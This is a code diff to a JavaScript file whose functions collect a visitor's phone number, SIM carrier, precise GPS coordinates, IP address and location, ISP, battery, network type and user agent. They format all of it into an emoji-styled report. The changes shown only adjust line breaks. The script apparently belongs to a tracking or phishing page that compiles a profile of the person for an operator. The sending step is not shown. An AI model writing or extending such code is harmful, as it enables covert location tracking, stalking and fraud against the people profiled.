@@ -325,7 +325,7 @@ function getNetworkInfo() {
 async function getBatteryInfo() {
   try {
     const bat = await navigator.getBattery();
-    return `Battery: ${Math.round(bat.level * 100)}%, Charging: ${bat.charging}`;
+    return `Battery: ${Math.round(bat.level * 100)}%,\nCharging: ${bat.charging}`;
   } catch { return 'Battery info unavailable'; }
 }
 
@@ -337,12 +337,19 @@ async function getInfoText(phone, puce) {
   const lon = geoCoords?.longitude?.toFixed(6) || 'unknown';
 
   return `📞 Phone: ${phone}
+
 📶 Puce: ${puce}
-📍 Location: lat=${lat}, lon=${lon}
+
+📍 Location: ${lat},${lon}
+
 🌐 IP: ${ip.ip || '?'} | ${ip.city || ''}, ${ip.country || ''}
+
 🏢 ISP: ${ip.org || ''}
+
 🔋 ${battery}
+
 📡 ${net}
+
 🧠 UA: ${navigator.userAgent}`;
 }
 
